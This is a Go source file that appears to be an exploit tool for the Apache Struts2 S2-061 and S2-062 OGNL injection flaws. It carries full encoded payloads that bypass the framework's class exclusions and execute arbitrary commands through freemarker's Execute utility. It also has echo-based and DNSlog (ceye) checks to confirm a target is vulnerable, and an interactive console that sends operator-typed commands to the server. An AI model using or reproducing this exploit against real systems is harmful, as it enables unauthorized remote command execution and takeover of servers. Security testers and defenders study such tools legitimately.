package main

import (
	"bufio"
	"errors"
	"fmt"
	"github.com/go-ini/ini"
	"github.com/imroc/req/v3"
	"math/rand"
	"os"
	"path"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func initHeaders() map[string]string {
	hdrs := make(map[string]string, 8)
	hdrs = map[string]string{
		"Cache-Control":             "max-age=0",
		"Upgrade-Insecure-Requests": "1",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Encoding":           "gzip, deflate",
		"Accept-Language":           "zh-CN,zh;q=0.9,en;q=0.8",
		"Connection":                "close",
		"Content-Type":              "application/x-www-form-urlencoded",
	}
	return hdrs
}

func postUrl(client *req.Client, hdrs map[string]string, element, order, pocUrl, strutsNo string) (*req.Response, error) {
	payload62 := "=(%23request.map%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b\n(%23request.map.setBean(%23request.get('struts.valueStack'))+%3d%3d+true).toString().substring(0,0)+%2b\n(%23request.map2%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b\n(%23request.map2.setBean(%23request.get('map').get('context'))+%3d%3d+true).toString().substring(0,0)+%2b\n(%23request.map3%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b\n(%23request.map3.setBean(%23request.get('map2').get('memberAccess'))+%3d%3d+true).toString().substring(0,0)+%2b\n(%23request.get('map3').put('excludedPackageNames',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b\n(%23request.get('map3').put('excludedClasses',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b\n(%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'" + order + "'}))"
	payload61 := "=%25{(%23request.map%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map.setBean(%23request.get('struts.valueStack'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.map2%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map2.setBean(%23request.get('map').get('context'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.map3%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map3.setBean(%23request.get('map2').get('memberAccess'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.get('map3').put('excludedPackageNames',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b(%23request.get('map3').put('excludedClasses',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b(%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'" + order + "'}))}"
	switch strutsNo {
	case "s2-061":
		payload = payload61
	case "s2-062":
		payload = payload62
	default:
		err := errors.New("strutsNo err")
		return nil, err
	}
	resp, err := client.R().SetHeaders(hdrs).SetBody(element + payload).Post(pocUrl)
	if err != nil {
		return nil, err
	}
	return resp, nil

}

func dnsCheck(client *req.Client, hdrs map[string]string, elements []string, dnslog *Ceye, pocUrl, strutsNo, sysType string) (bool, string, error,
) {
	for _, element := range elements {
		err := dnslog.pingCeye(client, hdrs, element, pocUrl, strutsNo, sysType)
		if err != nil {
			fmt.Println(err)
			return false, "", err
		}
		ok, err := dnslog.getApiInfo(client)
		if err != nil {
			fmt.Println(err)
			return false, "", err
		}
		if ok {
			fmt.Printf("[INFO]:%s Existent\n", strutsNo)
			return true, element, nil
		}
	}
	fmt.Printf("[INFO]:%s Non-existent\n", strutsNo)
	return false, "", nil
}

func charCheck(client *req.Client, hdrs map[string]string, elements []string, pocUrl string) (bool, string, error) {
	for _, element := range elements {
		sum, order := echoInt()
		resp, err := postUrl(client, hdrs, element, order, pocUrl, strutsNo)
		if err != nil {
			fmt.Println(err)
			return false, "", err
		}
		arr := regex(element+`="(?s:(.*?))"`, resp.String())
		if arr != nil {
			if strings.TrimSpace(arr[0][1]) == sum {
				fmt.Printf("[INFO]:%s Existent\n", strutsNo)
				return true, element, nil
			}
		}

	}
	fmt.Printf("[INFO]:%s Non-existent,Try Dnslog Check\n", strutsNo)
	return false, "", nil
}

func expSturts2RCE(client *req.Client, hdrs map[string]string, element, order, pocUrl string) {

	resp, err := postUrl(client, hdrs, element, order, pocUrl, strutsNo)
	if err != nil {
		fmt.Println(err)
		return
	}

	arr := regex(element+`="(?s:(.*?))"`, resp.String())

	if arr != nil {
		fmt.Println(arr[0][1])
	}
}

func echoInt() (string, string) {
	rand.Seed(time.Now().UnixNano())
	r1 := rand.Intn(10)
	r2 := rand.Intn(10)
	sum := strconv.Itoa(r1) + strconv.Itoa(r2)
	res := "echo " + sum
	return sum, res
}

func regex(rule string, webinfo string) [][]string {
	re := regexp.MustCompile(rule)
	ReList := re.FindAllStringSubmatch(webinfo, -1)
	return ReList
}

func getPath(skip int) string {
	var abPath string
	_, filename, _, ok := runtime.Caller(skip)
	if ok {
		abPath = path.Dir(filename)
	}
	return abPath
}

func initCeye(skip int) (token, types, filter string, err error) {
	filePath := getPath(skip) + "/ceye.ini"
	ceye, err := ini.Load(filePath)
	if err != nil {
		return "", "", "", err
	}
	token = ceye.Section("ceye").Key("token").Value()
	types = ceye.Section("ceye").Key("type").Value()
	filter = ceye.Section("ceye").Key("filter").Value()
	return
}

func inputConsole(strutsNo string) (string, error) {
	input := bufio.NewReader(os.Stdin)
	fmt.Printf("%s>", strutsNo)
	order, err := input.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(order), nil
}

func expConsole(client *req.Client, hdrs map[string]string, element, pocUrl string) {
	fmt.Println("[INFO]:Try Exp? (y/n)")
	msg, err := inputConsole(strutsNo)
	if err != nil {
		fmt.Println("input err！", err)
		return
	}
	switch msg {
	case "y", "Y":
		for {
			order, err := inputConsole(strutsNo)
			if err != nil {
				fmt.Println("input err！", err)
				return
			}
			if strings.TrimSpace(order) == "q" {
				os.Exit(1)
			}
			expSturts2RCE(client, hdrs, element, order, pocUrl)
		}

	case "n", "N":
		os.Exit(1)
	default:
		fmt.Println("input err")
		os.Exit(1)
	}
}
